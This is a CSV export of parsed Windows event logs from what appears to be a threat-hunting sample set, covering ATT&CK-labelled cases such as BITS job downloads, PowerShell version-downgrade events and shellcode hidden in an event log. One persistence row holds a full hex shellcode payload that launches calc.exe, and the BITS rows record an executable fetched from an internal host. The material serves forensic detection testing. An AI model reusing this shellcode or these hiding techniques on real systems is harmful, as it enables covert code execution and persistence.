RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
9,13260,2021-11-18 07:40:46.4042265,23,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileDelete (A file delete was detected),CYBERCAT\pc1-user,,"ProcessID: 3384, ProcessGUID: 510c1e8a-ef2f-6195-6200-000000000f00",RuleName: -,"SHA1=AD996093712DA7BD4BDFED52498E8795417F41A3,MD5=111B9F86AC9B497A859574C669C56A70,SHA256=53D456FFC72B04EE0873A5191E1C8E9140DD12BC5231E5A18EEBCE585F473C6A,IMPHASH=00000000000000000000000000000000",TargetFilename: C:\Users\pc1-user\AppData\Roaming\Microsoft\Windows\Recent\sysmon.evtx.lnk,IsExecutable: False,Archived: true,C:\Windows\Explorer.EXE,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:46.384""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef2f-6195-6200-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3384""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\sysmon.evtx.lnk""},{""@Name"":""Hashes"",""#text"":""SHA1=AD996093712DA7BD4BDFED52498E8795417F41A3,MD5=111B9F86AC9B497A859574C669C56A70,SHA256=53D456FFC72B04EE0873A5191E1C8E9140DD12BC5231E5A18EEBCE585F473C6A,IMPHASH=00000000000000000000000000000000""},{""@Name"":""IsExecutable"",""#text"":""False""},{""@Name"":""Archived"",""#text"":""true""}]}}"
1,2,2022-05-24 04:59:06.9098014,1337,Info,Persistence,Key Management Service,0,0,YamatoSecurity,0,,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/SharpEventPersistHiddenShellcode.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6A018D85B20000005068318B6F87FFD5BBF0B5A25668A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD563616C632E65786500"",""Binary"":""""}}"
1,11,2021-06-13 06:17:17.9901393,306,Verbose,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,356,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":""""}"
2,12,2021-06-13 06:17:18.0443734,3,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1776,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS service created a new job,hns\Administrator,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,,,,,C:\Windows\System32\bitsadmin.exe,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""jobTitle"",""#text"":""test""},{""@Name"":""jobId"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""jobOwner"",""#text"":""hns\\Administrator""},{""@Name"":""processPath"",""#text"":""C:\\Windows\\System32\\bitsadmin.exe""},{""@Name"":""processId"",""#text"":""1020""}]}}"
3,13,2021-06-13 06:17:18.0566727,310,Warning,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,2796,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""ErrorCode"",""#text"":""2147942450""}}}"
4,14,2021-06-13 06:17:18.0870544,59,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,2796,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS transfer has started,,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,URL: http://192.168.10.254:80/calc.exe,"Peer: ",Total Bytes: 32256 (Transferred: 0),Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""transferId"",""#text"":""837fb303-0b01-460e-9024-ff2f735b3c82""},{""@Name"":""name"",""#text"":""test""},{""@Name"":""Id"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""url"",""#text"":""http://192.168.10.254:80/calc.exe""},{""@Name"":""peer""},{""@Name"":""fileTime"",""#text"":""2021-05-19 02:42:52.0000000""},{""@Name"":""fileLength"",""#text"":""32256""},{""@Name"":""bytesTotal"",""#text"":""32256""},{""@Name"":""bytesTransferred"",""#text"":""0""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""}]}}"
5,15,2021-06-13 06:17:28.3125975,60,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1268,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS transfer has stopped,,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,URL: http://192.168.10.254:80/calc.exe,"Peer: ",Total Bytes: 32256 (Transferred: 32256),Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""transferId"",""#text"":""837fb303-0b01-460e-9024-ff2f735b3c82""},{""@Name"":""name"",""#text"":""test""},{""@Name"":""Id"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""url"",""#text"":""http://192.168.10.254:80/calc.exe""},{""@Name"":""peer""},{""@Name"":""hr"",""#text"":""0""},{""@Name"":""fileTime"",""#text"":""2021-05-19 02:42:52.0000000""},{""@Name"":""fileLength"",""#text"":""32256""},{""@Name"":""bytesTotal"",""#text"":""32256""},{""@Name"":""bytesTransferred"",""#text"":""32256""},{""@Name"":""proxy""},{""@Name"":""peerProtocolFlags"",""#text"":""0""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""},{""@Name"":""AdditionalInfoHr"",""#text"":""0""},{""@Name"":""PeerContextInfo"",""#text"":""0""},{""@Name"":""bandwidthLimit"",""#text"":""18446744073709551615""},{""@Name"":""ignoreBandwidthLimitsOnLan"",""#text"":""False""}]}}"
6,16,2021-06-13 06:17:28.3341955,4,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1268,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS job completion,hns\Administrator,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,fileCount: 1,jobOwner: hns\Administrator,Bytes Transferred: 32256,Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""User"",""#text"":""hns\\Administrator""},{""@Name"":""jobTitle"",""#text"":""test""},{""@Name"":""jobId"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""jobOwner"",""#text"":""hns\\Administrator""},{""@Name"":""fileCount"",""#text"":""1""},{""@Name"":""bytesTransferred"",""#text"":""32256""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""}]}}"
7,17,2021-06-13 06:19:28.3511197,308,Warning,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,356,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""number"",""#text"":""3199.234""}}}"
705,705,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
706,706,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
707,707,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
708,708,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
709,709,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
710,710,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
711,711,2021-01-28 09:58:44.5387607,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
712,712,2021-01-28 09:58:44.6482499,800,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Pipeline Execution Details,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=DESKTOP-ST69BPO\\user01\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\n"",""Binary"":""""}}"
713,713,2021-01-28 09:58:44.8355471,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from Available to Stopped,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=17\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
714,714,2021-01-28 10:22:26.3668321,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=10\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
715,715,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=12\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
716,716,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=14\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
717,717,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=16\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
718,718,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=18\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
719,719,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=20\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
720,720,2021-01-28 10:22:26.3826720,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=22\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=7d995610-1656-4675-a6fd-458a9f4f8b7c\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
721,721,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"WSMan, Started, 	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""WSMan, Started, \tProviderName=WSMan\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
722,722,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=2

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=2\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
723,723,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
